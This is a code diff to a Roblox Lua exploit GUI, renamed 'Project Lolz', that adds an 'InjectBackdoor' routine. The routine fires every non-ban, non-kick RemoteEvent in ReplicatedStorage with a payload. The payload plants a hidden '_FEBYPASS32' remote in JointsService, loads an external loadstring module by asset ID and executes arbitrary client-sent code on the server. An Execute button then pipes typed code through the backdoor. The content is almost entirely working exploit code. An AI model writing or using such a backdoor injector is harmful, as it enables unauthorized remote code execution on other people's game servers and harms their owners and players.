@@ -46,7 +46,7 @@ G2L["Title_6"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 G2L["Title_6"].TextColor3 = Color3.fromRGB(255, 255, 255)
 G2L["Title_6"].BackgroundTransparency = 1
 G2L["Title_6"].Size = UDim2.new(0.33831, 0, 0.10909, 0)
-G2L["Title_6"].Text = "Project Meteorite (Scanner)"
+G2L["Title_6"].Text = "Project Lolz"
 G2L["Title_6"].Name = "Title"
 
 G2L["ScrollingFrame_7"] = Instance.new("ScrollingFrame", G2L["Frame_2"])
@@ -100,55 +100,67 @@ G2L["Inject_10"].Text = "Inject"
 G2L["Inject_10"].Name = "Inject"
 G2L["Inject_10"].Position = UDim2.new(0.82587, 0, 0.66364, 0)
 
+G2L["Status_12"] = Instance.new("TextLabel", G2L["Frame_2"])
+G2L["Status_12"].BorderSizePixel = 0
+G2L["Status_12"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+G2L["Status_12"].TextColor3 = Color3.fromRGB(255, 0, 0)
+G2L["Status_12"].BackgroundTransparency = 1
+G2L["Status_12"].Size = UDim2.new(0.22388, 0, 0.1, 0)
+G2L["Status_12"].Text = "Not Injected!"
+G2L["Status_12"].Name = "Status"
+G2L["Status_12"].Position = UDim2.new(0.75124, 0, 0.00909, 0)
+
+G2L["Injected?_13"] = Instance.new("BoolValue", G2L["Status_12"])
+G2L["Injected?_13"].Name = "Injected?"
+
 G2L["UIAspectRatioConstraint_14"] = Instance.new("UIAspectRatioConstraint", G2L["Frame_2"])
 G2L["UIAspectRatioConstraint_14"].AspectRatio = 1.82727
 
-local Vulnerability = nil
-
-local function directExecute()
-	local codeTextBox = G2L["TextBox_b"]
-	local executeBtn = G2L["Execute_c"]
-	executeBtn.MouseButton1Click:Connect(function()
-		if Vulnerability then
-			local success, err = pcall(function()
-				Vulnerability:FireServer(codeTextBox.Text)
-			end)
-			if not success then
-				warn("Failed to fire remote: "..tostring(err))
-			end
-		else
-			warn("RemoteEvent 'Vulnerability' not found.")
+local function InjectBackdoor()
+	local function search(folder)
+		local function inject(remote)
+			remote:FireServer([[
+				local folder = Instance.new('RemoteEvent')
+				folder.Name = "_FEBYPASS32"
+				folder.Parent = game:GetService("JointsService")
+				local loadstring = require(13684410229)
+				folder.OnServerEvent:Connect(function(_1,_2)
+					loadstring(_2)()
+				end)
+			]])
 		end
-	end)
-end
-task.spawn(directExecute)
-
-local function C_f()
-	local button = G2L["Clear_e"]
-	button.MouseButton1Click:Connect(function()
-		G2L["TextBox_b"].Text = ""
-	end)
-end
-task.spawn(C_f)
-
-local function C_11()
-	for _, obj in ipairs(game:GetDescendants()) do
-		if obj:IsA("RemoteEvent") then
-			local success = pcall(function()
-				obj:FireServer("print('hi')")
-			end)
-			if success then
-				Vulnerability = obj
-				warn("[Project Lolz]: Remote hooked:", obj:GetFullName())
-				break
+		for _, v in pairs(folder:GetChildren()) do
+			if v:IsA("RemoteEvent") then
+				if not string.match(string.lower(v.Name), "ban") and not string.match(string.lower(v.Name), "kick") then
+					inject(v)
+				end
 			end
+			search(v)
 		end
 	end
-
-	if not Vulnerability then
-		warn("[Project Lolz]: No remote found")
+	search(game:GetService("ReplicatedStorage"))
+	local t, max = 0, 5
+	repeat wait(0.1) t += 0.1 until game:GetService("JointsService"):FindFirstChild("_FEBYPASS32") or t >= max
+	if game:GetService("JointsService"):FindFirstChild("_FEBYPASS32") then
+		G2L["Status_12"].Text = "Injected!"
+		G2L["Status_12"].TextColor3 = Color3.fromRGB(0, 255, 0)
+	else
+		G2L["Status_12"].Text = "Not Injected!"
+		G2L["Status_12"].TextColor3 = Color3.fromRGB(255, 0, 0)
 	end
 end
-G2L["Inject_10"].MouseButton1Click:Connect(C_11)
+
+G2L["Inject_10"].MouseButton1Click:Connect(InjectBackdoor)
+
+G2L["Execute_c"].MouseButton1Click:Connect(function()
+	local remote = game:GetService("JointsService"):FindFirstChild("_FEBYPASS32")
+	if remote then
+		remote:FireServer(G2L["TextBox_b"].Text)
+	end
+end)
+
+G2L["Clear_e"].MouseButton1Click:Connect(function()
+	G2L["TextBox_b"].Text = ""
+end)
 
 return G2L["ScreenGui_1"]
